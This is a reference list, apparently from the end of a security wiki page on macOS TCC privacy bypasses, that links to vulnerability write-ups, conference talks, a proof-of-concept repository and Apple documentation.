- [4] [Where in the World is Carmen Sandiego: Abusing Location Services on macOS](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [5] [Jamf Threat Labs - CVE-2024-44131: TCC bypass steals data from iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG env variables)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [7] [Apple - Allow DYLD environment variables entitlement](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [8] [The Eclectic Light Company - Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [9] [Zero-Day TCC bypass discovered in XCSSET malware](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [10] [OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [11] [New macOS vulnerability, "powerdir," could lead to unauthorized user data access](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [12] [Change home directory and bypass TCC aka CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [13] [Play the music and bypass TCC aka CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [14] [How to rob a (Fire)fox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [15] [CVE-2023-26818 - Bypassing TCC with Telegram in macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [16] [Kandji - Uncovering Apple Vulnerabilities: diskarbitrationd and storagekitd Audit Part 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [17] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks & CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
- [18] [breakpointHQ/TCC-ClickJacking - Proof of Concept](https://github.com/breakpointHQ/TCC-ClickJacking)
- [19] [Stack Overflow - Setting environment variables on OS X](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
- [20] [theevilbit - CVE-2020-9771: mount_apfs TCC bypass and privilege escalation](https://theevilbit.github.io/posts/cve_2020_9771/)
- [21] [theevilbit - CVE-2021-30808: TCC bypass by mounting over the TCC database](https://theevilbit.github.io/posts/cve-2021-30808/)
- [22] [20+ Ways to Bypass Your macOS Privacy Mechanisms](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [23] [Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms](https://www.youtube.com/watch?v=a9hsxPdRxsY)

{{#include ../../../../../banners/hacktricks-training.md}}
